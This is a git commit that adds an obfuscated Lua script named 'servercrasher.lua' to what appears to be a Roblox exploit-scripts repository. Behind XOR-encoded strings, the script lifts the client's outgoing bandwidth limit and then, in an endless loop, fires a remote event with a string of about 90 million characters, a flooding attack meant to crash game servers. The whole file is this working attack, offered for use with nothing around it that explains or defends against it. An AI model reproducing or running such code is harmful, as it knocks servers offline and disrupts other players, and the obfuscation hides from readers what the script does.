e8b3da00892936d7f125f8c9852d6076f72ff921
eyesing <77251330+mlnitoon2@users.noreply.github.com>
2025-02-08 20:47:25 -0600

    Create servercrasher.lua

---
+++ rokfe/scripts/servercrasher.lua
@@ -0,0 +1,12 @@
+--[[
+ .____                  ________ ___.    _____                           __                
+ |    |    __ _______   \_____  \\_ |___/ ____\_ __  ______ ____ _____ _/  |_  ___________ 
+ |    |   |  |  \__  \   /   |   \| __ \   __\  |  \/  ___// ___\\__  \\   __\/  _ \_  __ \
+ |    |___|  |  // __ \_/    |    \ \_\ \  | |  |  /\___ \\  \___ / __ \|  | (  <_> )  | \/
+ |_______ \____/(____  /\_______  /___  /__| |____//____  >\___  >____  /__|  \____/|__|   
+         \/          \/         \/    \/                \/     \/     \/                   
+          \_Welcome to LuaObfuscator.com   (Alpha 0.10.8) ~  Much Love, Ferib 
+
+]]--
+
+local v0=string.char;local v1=string.byte;local v2=string.sub;local v3=bit32 or bit ;local v4=v3.bxor;local v5=table.concat;local v6=table.insert;local function v7(v8,v9) local v10={};for v15=1, #v8 do v6(v10,v0(v4(v1(v2(v8,v15,v15 + 1 )),v1(v2(v9,1 + (v15% #v9) ,1 + (v15% #v9) + 1 )))%256 ));end return v5(v10);end while task.wait(927.5 -(214 + 713) ) do local v11=0 + 0 ;local v12;local v13;local v14;while true do if (v11==(1 + 0)) then v14=string.rep("9",90000877 -(282 + 595) );game:GetService(v7("\13\200\62\210\243\49\198\9\201\245\38\195\62","\156\67\173\74\165")):SetOutgoingKBPSLimit(math.huge);v11=1639 -(1523 + 114) ;end if (v11==(2 + 0)) then v13:FireServer(v14);break;end if (v11==(0 -0)) then v12=game:GetService(v7("\227\204\217\41\233\163\245\27\193\207\210\38\231\175\194\26\226\215\212\55\231\188\194","\126\177\163\187\69\134\219\167"));v13=v12.RequestDeviceCameraCFrame;v11=1066 -(68 + 997) ;end end end
